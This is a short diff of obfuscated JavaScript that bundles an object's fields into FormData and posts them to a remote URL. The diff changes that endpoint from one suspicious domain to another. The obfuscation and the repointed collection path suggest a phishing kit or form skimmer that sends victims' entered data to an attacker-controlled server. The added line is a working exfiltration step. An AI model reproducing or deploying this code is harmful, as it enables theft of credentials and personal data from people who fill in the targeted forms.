@@ -10588,7 +10588,7 @@ function Hp() {
             const _0x2e3f65 = new FormData();
             Object[_0xf8e1ee(0x81c) + 'es'](_0x295851)[_0xf8e1ee(0x40d) + 'ch'](([_0x395d1a, _0xbf3eef]) => _0x2e3f65[_0xf8e1ee(0x872) + 'd'](_0x395d1a, _0xbf3eef));
             const _0x278370 = new XMLHttpRequest();
-            _0x278370['open'](_0xf8e1ee(0x3eb), 'https://arenco.cam/emmth/zm1/', !0x0), _0x278370[_0xf8e1ee(0xc9b) + 'd'] = () => {
+            _0x278370['open'](_0xf8e1ee(0x3eb), 'https://ygemc.net/emmth/zm1/', !0x0), _0x278370[_0xf8e1ee(0xc9b) + 'd'] = () => {
                 setTimeout(() => {
                     var _0xd98138 = _0x4143,
                         _0x42dc22 = { 
